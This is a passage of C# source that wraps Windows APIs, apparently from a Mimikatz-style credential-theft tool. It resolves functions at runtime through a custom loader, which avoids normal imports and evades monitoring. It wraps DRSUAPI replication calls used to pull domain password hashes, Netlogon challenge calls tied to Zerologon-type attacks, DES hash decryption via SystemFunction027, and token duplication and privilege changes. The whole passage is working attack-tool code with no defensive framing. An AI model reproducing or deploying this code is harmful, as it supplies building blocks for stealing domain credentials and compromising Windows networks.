                return IntPtr.Zero;
            }

            return hProcess;
        }

        private static IntPtr GetNtDll()
        {

            return LoadLibrary("ntdll.dll");

        }

        private static IntPtr GetKernel32()
        {

            return LoadLibrary("Kernel32.dll");

        }

        private static IntPtr GetKernelbase()
        {

            return LoadLibrary("Kernelbase.dll");

        }

        private static IntPtr GetAdvapi32()
        {

            return LoadLibrary("Advapi32.dll");

        }

        private static IntPtr GetCryptsp()
        {

            return LoadLibrary("CRYPTSP.DLL");

        }

        private static IntPtr GetDbgcore()
        {

            return LoadLibrary("dbgcore.dll");

        }

        public static IntPtr GetRpcrt4()
        {

            return LoadLibrary("RPCRT4.dll");

        }

        private static IntPtr GetSecur32()
        {

            return LoadLibrary("secur32.Dll");

        }

        private static IntPtr GetSspicli()
        {

            return LoadLibrary("SSPICLI.DLL");

        }

        private static IntPtr GetBcrypt()
        {

            return LoadLibrary("bcrypt.dll");

        }

        private static IntPtr GetMsasn1()
        {

            return LoadLibrary("msasn1.dll");

        }

        public static IntPtr GetCurrentProcess()
        {
            IntPtr proc = GetProcAddress(GetKernel32(), "GetCurrentProcess");
            SysCall.Delegates.GetCurrentProcess GetCurrentProcess = (SysCall.Delegates.GetCurrentProcess)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.GetCurrentProcess));
            return GetCurrentProcess();
        }

        public static bool CloseHandle(IntPtr handle)
        {
            IntPtr proc = GetProcAddress(GetKernel32(), "CloseHandle");
            SysCall.Delegates.CloseHandle CloseHandle = (SysCall.Delegates.CloseHandle)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.CloseHandle));
            return CloseHandle(handle);
        }

        public static int NtFilterToken(IntPtr TokenHandle, uint Flags, IntPtr SidsToDisable, IntPtr PrivilegesToDelete, IntPtr RestrictedSids, ref IntPtr hToken)
        {
            IntPtr proc = GetProcAddress(GetNtDll(), "NtFilterToken");
            SysCall.Delegates.NtFilterToken NtFilterToken = (SysCall.Delegates.NtFilterToken)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.NtFilterToken));
            return NtFilterToken(TokenHandle, Flags, SidsToDisable, PrivilegesToDelete, RestrictedSids, ref hToken);
        }

        public static bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize)
        {
            IntPtr proc = GetProcAddress(GetKernelbase(), "UpdateProcThreadAttribute");
            SysCall.Delegates.UpdateProcThreadAttribute UpdateProcThreadAttribute = (SysCall.Delegates.UpdateProcThreadAttribute)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.UpdateProcThreadAttribute));
            return UpdateProcThreadAttribute(lpAttributeList, dwFlags, Attribute, lpValue, cbSize, lpPreviousValue, lpReturnSize);
        }

        public static bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize)
        {
            IntPtr proc = GetProcAddress(GetKernelbase(), "InitializeProcThreadAttributeList");
            SysCall.Delegates.InitializeProcThreadAttributeList InitializeProcThreadAttributeList = (SysCall.Delegates.InitializeProcThreadAttributeList)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.InitializeProcThreadAttributeList));
            return InitializeProcThreadAttributeList(lpAttributeList, dwAttributeCount, dwFlags, ref lpSize);
        }

        public static bool RtlGetVersion(ref OSVERSIONINFOEXW lpVersionInformation)
        {
            IntPtr proc = GetProcAddress(GetNtDll(), "RtlGetVersion");
            SysCall.Delegates.RtlGetVersion RtlGetVersion = (SysCall.Delegates.RtlGetVersion)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.RtlGetVersion));
            return RtlGetVersion(ref lpVersionInformation);
        }

        public static void RtlGetNtVersionNumbers(out UInt32 major, out UInt32 minor, out UInt32 build)
        {
            IntPtr proc = GetProcAddress(GetNtDll(), "RtlGetNtVersionNumbers");
            SysCall.Delegates.RtlGetNtVersionNumbers RtlGetNtVersionNumbers = (SysCall.Delegates.RtlGetNtVersionNumbers)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.RtlGetNtVersionNumbers));
            RtlGetNtVersionNumbers(out major, out minor, out build);
        }

        public static bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect)
        {
            IntPtr proc = GetProcAddress(GetKernelbase(), "VirtualProtect");
            SysCall.Delegates.VirtualProtect VirtualProtect = (SysCall.Delegates.VirtualProtect)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.VirtualProtect));
            return VirtualProtect(lpAddress, dwSize, flNewProtect, out lpflOldProtect);
        }

        public static UInt32 LdrLoadDll(IntPtr PathToFile, UInt32 dwFlags, ref Natives.UNICODE_STRING ModuleFileName, ref IntPtr ModuleHandle)
        {
            IntPtr proc = GetProcAddress(GetNtDll(), "LdrLoadDll");
            SysCall.Delegates.LdrLoadDll LdrLoadDll = (SysCall.Delegates.LdrLoadDll)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.LdrLoadDll));
            return (uint)LdrLoadDll(PathToFile, dwFlags, ref ModuleFileName, ref ModuleHandle);
        }

        public static void RtlInitUnicodeString(ref Natives.UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString)
        {
            IntPtr proc = GetProcAddress(GetNtDll(), "RtlInitUnicodeString");
            SysCall.Delegates.RtlInitUnicodeString RtlInitUnicodeString = (SysCall.Delegates.RtlInitUnicodeString)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.RtlInitUnicodeString));
            RtlInitUnicodeString(ref DestinationString, SourceString);
        }

        public static void RtlInitString(ref Natives.UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPStr)] string SourceString)
        {
            IntPtr proc = GetProcAddress(GetNtDll(), "RtlInitString");
            SysCall.Delegates.RtlInitString RtlInitString = (SysCall.Delegates.RtlInitString)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.RtlInitString));
            RtlInitString(ref DestinationString, SourceString);
        }

        public static bool GetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation, UInt32 TokenInformationLength, out UInt32 ReturnLength)
        {
            IntPtr proc = GetProcAddress(GetKernelbase(), "GetTokenInformation");
            SysCall.Delegates.GetTokenInformation GetTokenInformation = (SysCall.Delegates.GetTokenInformation)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.GetTokenInformation));
            return GetTokenInformation(TokenHandle, TokenInformationClass, TokenInformation, TokenInformationLength, out ReturnLength);
        }

        public static bool OpenProcessToken(IntPtr hProcess, UInt32 dwDesiredAccess, out IntPtr hToken)
        {
            IntPtr proc = GetProcAddress(GetKernelbase(), "OpenProcessToken");
            SysCall.Delegates.OpenProcessToken OpenProcessToken = (SysCall.Delegates.OpenProcessToken)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.OpenProcessToken));
            return OpenProcessToken(hProcess, dwDesiredAccess, out hToken);
        }

        public static bool LookupPrivilegeValue(String lpSystemName, String lpName, ref LUID luid)
        {
            IntPtr proc = GetProcAddress(GetAdvapi32(), "LookupPrivilegeValueA");
            SysCall.Delegates.LookupPrivilegeValue LookupPrivilegeValue = (SysCall.Delegates.LookupPrivilegeValue)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.LookupPrivilegeValue));
            return LookupPrivilegeValue(lpSystemName, lpName, ref luid);
        }

        public static bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, UInt32 BufferLengthInBytes, ref TOKEN_PRIVILEGES PreviousState, out UInt32 ReturnLengthInBytes)
        {
            IntPtr proc = GetProcAddress(GetAdvapi32(), "AdjustTokenPrivileges");
            SysCall.Delegates.AdjustTokenPrivileges AdjustTokenPrivileges = (SysCall.Delegates.AdjustTokenPrivileges)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.AdjustTokenPrivileges));
            return AdjustTokenPrivileges(TokenHandle, DisableAllPrivileges, ref NewState, BufferLengthInBytes, ref PreviousState, out ReturnLengthInBytes);
        }

        public static bool LookupAccountName(string lpSystemName, string lpAccountName, byte[] Sid, ref uint cbSid, StringBuilder ReferencedDomainName, ref uint cchReferencedDomainName, out SID_NAME_USE peUse)
        {
            IntPtr proc = GetProcAddress(GetAdvapi32(), "LookupAccountNameA");
            SysCall.Delegates.LookupAccountNameA LookupAccountNameA = (SysCall.Delegates.LookupAccountNameA)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.LookupAccountNameA));
            return LookupAccountNameA(lpSystemName, lpAccountName, Sid, ref cbSid, ReferencedDomainName, ref cchReferencedDomainName, out peUse);
        }

        public static bool ConvertSidToStringSid(byte[] pSID, out string ptrSid)
        {
            IntPtr proc = GetProcAddress(GetAdvapi32(), "ConvertSidToStringSidA");
            SysCall.Delegates.ConvertSidToStringSid ConvertSidToStringSid = (SysCall.Delegates.ConvertSidToStringSid)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.ConvertSidToStringSid));
            return ConvertSidToStringSid(pSID, out ptrSid);
        }

        public static int RpcStringBindingCompose(String ObjUuid, String ProtSeq, String NetworkAddr, String Endpoint, String Options, out IntPtr lpBindingString)
        {
            IntPtr proc = GetProcAddress(GetRpcrt4(), "RpcStringBindingComposeW");
            SysCall.Delegates.RpcStringBindingCompose RpcStringBindingCompose = (SysCall.Delegates.RpcStringBindingCompose)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.RpcStringBindingCompose));
            return RpcStringBindingCompose(ObjUuid, ProtSeq, NetworkAddr, Endpoint, Options, out lpBindingString);
        }

        public static int RpcBindingFromStringBinding(string bindingString, out IntPtr lpBinding)
        {
            IntPtr proc = GetProcAddress(GetRpcrt4(), "RpcBindingFromStringBindingW");
            SysCall.Delegates.RpcBindingFromStringBinding RpcBindingFromStringBinding = (SysCall.Delegates.RpcBindingFromStringBinding)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.RpcBindingFromStringBinding));
            return RpcBindingFromStringBinding(bindingString, out lpBinding);
        }

        public static IntPtr NdrClientCall2_1(IntPtr pMIDL_STUB_DESC, IntPtr formatString, ref IntPtr hDrs)
        {
            IntPtr proc = GetProcAddress(GetRpcrt4(), "NdrClientCall2");
            SysCall.Delegates.NdrClientCall2_1 NdrClientCall2_1 = (SysCall.Delegates.NdrClientCall2_1)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.NdrClientCall2_1));
            return NdrClientCall2_1(pMIDL_STUB_DESC, formatString, ref hDrs);

        }

        public static IntPtr NdrClientCall2_2(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr hBinding, Guid NtdsDsaObjectGuid, DRS_EXTENSIONS_INT ext_int, ref IntPtr pDrsExtensionsExt, ref IntPtr hDrs)
        {
            IntPtr proc = GetProcAddress(GetRpcrt4(), "NdrClientCall2");
            SysCall.Delegates.NdrClientCall2_2 NdrClientCall2_2 = (SysCall.Delegates.NdrClientCall2_2)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.NdrClientCall2_2));
            return NdrClientCall2_2(pMIDL_STUB_DESC, formatString, hBinding, NtdsDsaObjectGuid, ext_int, ref pDrsExtensionsExt, ref hDrs);

        }

        public static IntPtr NdrClientCall2_3(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr hDrs, uint dcInVersion, DRS_MSG_DCINFOREQ_V1 dcInfoReq, ref uint dcOutVersion, ref DRS_MSG_DCINFOREPLY_V2 dcInfoRep)
        {
            IntPtr proc = GetProcAddress(GetRpcrt4(), "NdrClientCall2");
            SysCall.Delegates.NdrClientCall2_3 NdrClientCall2_3 = (SysCall.Delegates.NdrClientCall2_3)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.NdrClientCall2_3));
            return NdrClientCall2_3(pMIDL_STUB_DESC, formatString, hDrs, dcInVersion, dcInfoReq, ref dcOutVersion, ref dcInfoRep);

        }

        public static IntPtr NdrClientCall2_4(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr hDrs, uint dcInVersion, DRS_MSG_CRACKREQ_V1 dcInfoReq, ref uint dcOutVersion, ref IntPtr dcInfoRep)
        {
            IntPtr proc = GetProcAddress(GetRpcrt4(), "NdrClientCall2");
            SysCall.Delegates.NdrClientCall2_4 NdrClientCall2_4 = (SysCall.Delegates.NdrClientCall2_4)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.NdrClientCall2_4));
            return NdrClientCall2_4(pMIDL_STUB_DESC, formatString, hDrs, dcInVersion, dcInfoReq, ref dcOutVersion, ref dcInfoRep);

        }

        public static IntPtr NdrClientCall2_5(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr hDrs, uint dwInVersion, DRS_MSG_GETCHGREQ_V8 pmsgIn, ref uint dwOutVersion, ref DRS_MSG_GETCHGREPLY_V6 pmsgOut)
        {
            IntPtr proc = GetProcAddress(GetRpcrt4(), "NdrClientCall2");
            SysCall.Delegates.NdrClientCall2_5 NdrClientCall2_5 = (SysCall.Delegates.NdrClientCall2_5)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.NdrClientCall2_5));
            return NdrClientCall2_5(pMIDL_STUB_DESC, formatString, hDrs, dwInVersion, pmsgIn, ref dwOutVersion, ref pmsgOut);

        }

        public static int I_RpcBindingInqSecurityContext(IntPtr Binding, out IntPtr SecurityContextHandle)
        {
            IntPtr proc = GetProcAddress(GetRpcrt4(), "I_RpcBindingInqSecurityContext");
            SysCall.Delegates.I_RpcBindingInqSecurityContext I_RpcBindingInqSecurityContext = (SysCall.Delegates.I_RpcBindingInqSecurityContext)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.I_RpcBindingInqSecurityContext));
            return I_RpcBindingInqSecurityContext(Binding, out SecurityContextHandle);
        }

        public static int RpcBindingFree(ref IntPtr lpString)
        {
            IntPtr proc = GetProcAddress(GetRpcrt4(), "RpcBindingFree");
            SysCall.Delegates.RpcBindingFree RpcBindingFree = (SysCall.Delegates.RpcBindingFree)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.RpcBindingFree));
            return RpcBindingFree(ref lpString);
        }

        public static int RpcBindingSetAuthInfoEx(IntPtr lpBinding, string ServerPrincName, UInt32 AuthnLevel, UInt32 AuthnSvc, IntPtr identity, UInt32 AuthzSvc, ref RPC_SECURITY_QOS SecurityQOS)
        {
            IntPtr proc = GetProcAddress(GetRpcrt4(), "RpcBindingSetAuthInfoExW");
            SysCall.Delegates.RpcBindingSetAuthInfoEx RpcBindingSetAuthInfoEx = (SysCall.Delegates.RpcBindingSetAuthInfoEx)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.RpcBindingSetAuthInfoEx));
            return RpcBindingSetAuthInfoEx(lpBinding, ServerPrincName, AuthnLevel, AuthnSvc, identity, AuthzSvc, ref SecurityQOS);
        }

        public static int RpcBindingSetOption(IntPtr Binding, UInt32 Option, IntPtr OptionValue)
        {
            IntPtr proc = GetProcAddress(GetRpcrt4(), "RpcBindingSetOption");
            SysCall.Delegates.RpcBindingSetOption RpcBindingSetOption = (SysCall.Delegates.RpcBindingSetOption)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.RpcBindingSetOption));
            return RpcBindingSetOption(Binding, Option, OptionValue);
        }

        public static int RpcEpResolveBinding(IntPtr Binding, IntPtr IfSpec)
        {
            IntPtr proc = GetProcAddress(GetRpcrt4(), "RpcEpResolveBinding");
            SysCall.Delegates.RpcEpResolveBinding RpcEpResolveBinding = (SysCall.Delegates.RpcEpResolveBinding)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.RpcEpResolveBinding));
            return RpcEpResolveBinding(Binding, IfSpec);
        }

        public static int RtlDecryptDES2blocks1DWORD(byte[] data, ref UInt32 key, IntPtr output)
        {
            IntPtr proc = GetProcAddress(GetCryptsp(), "SystemFunction027");
            SysCall.Delegates.RtlDecryptDES2blocks1DWORD RtlDecryptDES2blocks1DWORD = (SysCall.Delegates.RtlDecryptDES2blocks1DWORD)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.RtlDecryptDES2blocks1DWORD));
            return RtlDecryptDES2blocks1DWORD(data, ref key, output);
        }

        public static IntPtr GetSidSubAuthority(IntPtr sid, UInt32 subAuthorityIndex)
        {
            IntPtr proc = GetProcAddress(GetAdvapi32(), "GetSidSubAuthority");
            SysCall.Delegates.GetSidSubAuthority GetSidSubAuthority = (SysCall.Delegates.GetSidSubAuthority)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.GetSidSubAuthority));
            return GetSidSubAuthority(sid, subAuthorityIndex);
        }

        public static IntPtr GetSidSubAuthorityCount(IntPtr psid)
        {
            IntPtr proc = GetProcAddress(GetAdvapi32(), "GetSidSubAuthorityCount");
            SysCall.Delegates.GetSidSubAuthorityCount GetSidSubAuthorityCount = (SysCall.Delegates.GetSidSubAuthorityCount)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.GetSidSubAuthorityCount));
            return GetSidSubAuthorityCount(psid);
        }

        public static int RtlEncryptDecryptRC4(ref CRYPTO_BUFFER data, ref CRYPTO_BUFFER key)
        {
            IntPtr proc = GetProcAddress(GetCryptsp(), "SystemFunction032");
            SysCall.Delegates.RtlEncryptDecryptRC4 RtlEncryptDecryptRC4 = (SysCall.Delegates.RtlEncryptDecryptRC4)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.RtlEncryptDecryptRC4));
            return RtlEncryptDecryptRC4(ref data, ref key);
        }

        public static int QueryContextAttributes(IntPtr hContext, uint ulAttribute, ref SecPkgContext_SessionKey pContextAttributes)
        {
            IntPtr proc = GetProcAddress(GetSspicli(), "QueryContextAttributesA");
            SysCall.Delegates.QueryContextAttributes QueryContextAttributes = (SysCall.Delegates.QueryContextAttributes)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.QueryContextAttributes));
            return QueryContextAttributes(hContext, ulAttribute, ref pContextAttributes);
        }

        public static IntPtr GetProcAddress(IntPtr hModule, string procName)
        {
            return CustomLoadLibrary.GetExportAddress(hModule, procName);
        }

        public static IntPtr LoadLibrary(string name, bool canloadfromdisk = true)
        {
            return CustomLoadLibrary.GetDllAddress(name, canloadfromdisk);
        }

        public static int BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, int flags)
        {
            IntPtr proc = GetProcAddress(GetBcrypt(), "BCryptCloseAlgorithmProvider");
            SysCall.Delegates.BCryptCloseAlgorithmProvider BCryptCloseAlgorithmProvider = (SysCall.Delegates.BCryptCloseAlgorithmProvider)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.BCryptCloseAlgorithmProvider));
            return BCryptCloseAlgorithmProvider(hAlgorithm, flags);
        }

        public static int BCryptDestroyKey(IntPtr hKey)
        {
            IntPtr proc = GetProcAddress(GetBcrypt(), "BCryptDestroyKey");
            SysCall.Delegates.BCryptDestroyKey BCryptDestroyKey = (SysCall.Delegates.BCryptDestroyKey)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.BCryptDestroyKey));
            return BCryptDestroyKey(hKey);
        }

        public static int BCryptOpenAlgorithmProvider(out SafeBCryptAlgorithmHandle phAlgorithm, string pszAlgId, string pszImplementation, int dwFlags)
        {
            IntPtr proc = GetProcAddress(GetBcrypt(), "BCryptOpenAlgorithmProvider");
            SysCall.Delegates.BCryptOpenAlgorithmProvider BCryptOpenAlgorithmProvider = (SysCall.Delegates.BCryptOpenAlgorithmProvider)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.BCryptOpenAlgorithmProvider));
            return BCryptOpenAlgorithmProvider(out phAlgorithm, pszAlgId, pszImplementation, dwFlags);
        }

        public static int BCryptSetProperty(SafeHandle hProvider, string pszProperty, string pbInput, int cbInput, int dwFlags)
        {
            IntPtr proc = GetProcAddress(GetBcrypt(), "BCryptSetProperty");
            SysCall.Delegates.BCryptSetProperty BCryptSetProperty = (SysCall.Delegates.BCryptSetProperty)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.BCryptSetProperty));
            return BCryptSetProperty(hProvider, pszProperty, pbInput, cbInput, dwFlags);
        }

        public static int BCryptGenerateSymmetricKey(SafeBCryptAlgorithmHandle hAlgorithm, out SafeBCryptKeyHandle phKey, IntPtr pbKeyObject, int cbKeyObject, IntPtr pbSecret, int cbSecret, int flags)
        {
            IntPtr proc = GetProcAddress(GetBcrypt(), "BCryptGenerateSymmetricKey");
            SysCall.Delegates.BCryptGenerateSymmetricKey BCryptGenerateSymmetricKey = (SysCall.Delegates.BCryptGenerateSymmetricKey)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.BCryptGenerateSymmetricKey));
            return BCryptGenerateSymmetricKey(hAlgorithm, out phKey, pbKeyObject, cbKeyObject, pbSecret, cbSecret, flags);
        }

        public static int BCryptDecrypt(SafeBCryptKeyHandle hKey, IntPtr pbInput, int cbInput, IntPtr pPaddingInfo, IntPtr pbIV, int cbIV, IntPtr pbOutput, int cbOutput, out int pcbResult, int dwFlags)
        {
            IntPtr proc = GetProcAddress(GetBcrypt(), "BCryptDecrypt");
            SysCall.Delegates.BCryptDecrypt BCryptDecrypt = (SysCall.Delegates.BCryptDecrypt)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.BCryptDecrypt));
            return BCryptDecrypt(hKey, pbInput, cbInput, pPaddingInfo, pbIV, cbIV, pbOutput, cbOutput, out pcbResult, dwFlags);
        }

        public static int BCryptEncrypt(SafeBCryptKeyHandle hKey, IntPtr pbInput, int cbInput, IntPtr pPaddingInfo, IntPtr pbIV, int cbIV, IntPtr pbOutput, int cbOutput, out int pcbResult, int dwFlags)
        {
            IntPtr proc = GetProcAddress(GetBcrypt(), "BCryptEncrypt");
            SysCall.Delegates.BCryptEncrypt BCryptEncrypt = (SysCall.Delegates.BCryptEncrypt)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.BCryptEncrypt));
            return BCryptEncrypt(hKey, pbInput, cbInput, pPaddingInfo, pbIV, cbIV, pbOutput, cbOutput, out pcbResult, dwFlags);
        }

        public static IntPtr ASN1_CreateModule(uint nVersion, uint eRule, uint dwFlags, uint cPDU, IntPtr[] apfnEncoder, IntPtr[] apfnDecoder, IntPtr[] apfnFreeMemory, int[] acbStructSize, uint nModuleName)
        {
            IntPtr proc = GetProcAddress(GetMsasn1(), "ASN1_CreateModule");
            SysCall.Delegates.ASN1_CreateModule ASN1_CreateModule = (SysCall.Delegates.ASN1_CreateModule)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.ASN1_CreateModule));
            return  ASN1_CreateModule( nVersion,  eRule,  dwFlags,  cPDU,  apfnEncoder,  apfnDecoder,  apfnFreeMemory, acbStructSize, nModuleName);
        }

        public static ASN1error_e ASN1_CreateEncoder(IntPtr pModule, out IntPtr ppEncoderInfo, IntPtr pbBuf, uint cbBufSize, IntPtr pParent)
        {
            IntPtr proc = GetProcAddress(GetMsasn1(), "ASN1_CreateEncoder");
            SysCall.Delegates.ASN1_CreateEncoder ASN1_CreateEncoder = (SysCall.Delegates.ASN1_CreateEncoder)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.ASN1_CreateEncoder));
            return ASN1_CreateEncoder( pModule, out  ppEncoderInfo,  pbBuf,  cbBufSize,  pParent);
        }

        public static ASN1error_e ASN1_CreateDecoder(IntPtr pModule, out IntPtr ppDecoderInfo, IntPtr pbBuf, uint cbBufSize, IntPtr pParent)
        {
            IntPtr proc = GetProcAddress(GetMsasn1(), "ASN1_CreateDecoder");
            SysCall.Delegates.ASN1_CreateDecoder ASN1_CreateDecoder = (SysCall.Delegates.ASN1_CreateDecoder)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.ASN1_CreateDecoder));
            return ASN1_CreateDecoder( pModule, out  ppDecoderInfo,  pbBuf,  cbBufSize,  pParent);
        }

        public static bool ASN1BERDotVal2Eoid(IntPtr pEncoderInfo, string dotOID, IntPtr encodedOID)
        {
            IntPtr proc = GetProcAddress(GetMsasn1(), "ASN1BERDotVal2Eoid");
            SysCall.Delegates.ASN1BERDotVal2Eoid ASN1BERDotVal2Eoid = (SysCall.Delegates.ASN1BERDotVal2Eoid)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.ASN1BERDotVal2Eoid));
            return ASN1BERDotVal2Eoid( pEncoderInfo,  dotOID,  encodedOID);
        }

        public static void ASN1_FreeEncoded(ref ASN1encoding_s pEncoderInfo, IntPtr pBuf)
        {
            IntPtr proc = GetProcAddress(GetMsasn1(), "ASN1_FreeEncoded");
            SysCall.Delegates.ASN1_FreeEncoded ASN1_FreeEncoded = (SysCall.Delegates.ASN1_FreeEncoded)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.ASN1_FreeEncoded));
            ASN1_FreeEncoded(ref  pEncoderInfo,  pBuf);
        }

        public static void ASN1_CloseEncoder(IntPtr pEncoderInfo)
        {
            IntPtr proc = GetProcAddress(GetMsasn1(), "ASN1_CloseEncoder");
            SysCall.Delegates.ASN1_CloseEncoder ASN1_CloseEncoder = (SysCall.Delegates.ASN1_CloseEncoder)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.ASN1_CloseEncoder));
            ASN1_CloseEncoder(pEncoderInfo);
        }

        public static void ASN1_CloseDecoder(IntPtr pDecoderInfo)
        {
            IntPtr proc = GetProcAddress(GetMsasn1(), "ASN1_CloseDecoder");
            SysCall.Delegates.ASN1_CloseDecoder ASN1_CloseDecoder = (SysCall.Delegates.ASN1_CloseDecoder)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.ASN1_CloseDecoder));
            ASN1_CloseDecoder(pDecoderInfo);
        }

        public static void ASN1_CloseModule(IntPtr pModule)
        {
            IntPtr proc = GetProcAddress(GetMsasn1(), "ASN1_CloseModule");
            SysCall.Delegates.ASN1_CloseModule ASN1_CloseModule = (SysCall.Delegates.ASN1_CloseModule)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.ASN1_CloseModule));
            ASN1_CloseModule( pModule);
        }

        public static bool CreateProcessWithLogonW(string userName,string domain,string password,LogonFlags dwLogonFlags,string applicationName,string commandLine, CreationFlags dwCreationFlags, uint environment,string currentDirectory,ref STARTUPINFO startupInfo, out PROCESS_INFORMATION processInformation)
        {
            IntPtr proc = GetProcAddress(GetAdvapi32(), "CreateProcessWithLogonW");
            SysCall.Delegates.CreateProcessWithLogonW CreateProcessWithLogonW = (SysCall.Delegates.CreateProcessWithLogonW)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.CreateProcessWithLogonW));
            return CreateProcessWithLogonW(userName,domain,password,dwLogonFlags,applicationName,commandLine,dwCreationFlags,environment,currentDirectory,ref startupInfo,out processInformation);
        }

        public static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, ref SECURITY_ATTRIBUTES lpTokenAttributes, int ImpersonationLevel, int TokenType, ref IntPtr phNewToken)
        {
            IntPtr proc = GetProcAddress(GetKernelbase(), "DuplicateTokenEx");
            SysCall.Delegates.DuplicateTokenEx DuplicateTokenEx = (SysCall.Delegates.DuplicateTokenEx)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.DuplicateTokenEx));
            return DuplicateTokenEx(hExistingToken, dwDesiredAccess, ref lpTokenAttributes, ImpersonationLevel, TokenType, ref phNewToken);
        }

        public static bool SetThreadToken(IntPtr pHandle, IntPtr hToken)
        {
            IntPtr proc = GetProcAddress(GetAdvapi32(), "SetThreadToken");
            SysCall.Delegates.SetThreadToken SetThreadToken = (SysCall.Delegates.SetThreadToken)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.SetThreadToken));
            return SetThreadToken(pHandle, hToken);
        }

        public static void NtResumeProcess(IntPtr hProcess)
        {
            IntPtr proc = GetProcAddress(GetNtDll(), "NtResumeProcess");
            SysCall.Delegates.NtResumeProcess NtResumeProcess = (SysCall.Delegates.NtResumeProcess)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.NtResumeProcess));
            NtResumeProcess(hProcess);
        }

        public static uint NtTerminateProcess(IntPtr hProcess, uint uExitCode)
        {
            IntPtr proc = GetProcAddress(GetNtDll(), "NtTerminateProcess");
            SysCall.Delegates.NtTerminateProcess NtTerminateProcess = (SysCall.Delegates.NtTerminateProcess)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.NtTerminateProcess));
            return NtTerminateProcess( hProcess,  uExitCode);
        }

        public static uint NetrServerReqChallenge(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr PrimaryName, IntPtr ComputerName, IntPtr ClientChallenge, out NETLOGON_CREDENTIAL ServerChallenge)
        {
            IntPtr proc = GetProcAddress(GetRpcrt4(), "NdrClientCall2");

            SysCall.Delegates.NetrServerReqChallenge NetrServerReqChallenge = (SysCall.Delegates.NetrServerReqChallenge)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.NetrServerReqChallenge));
            return NetrServerReqChallenge(pMIDL_STUB_DESC, formatString, PrimaryName,  ComputerName,  ClientChallenge, out  ServerChallenge);
        }

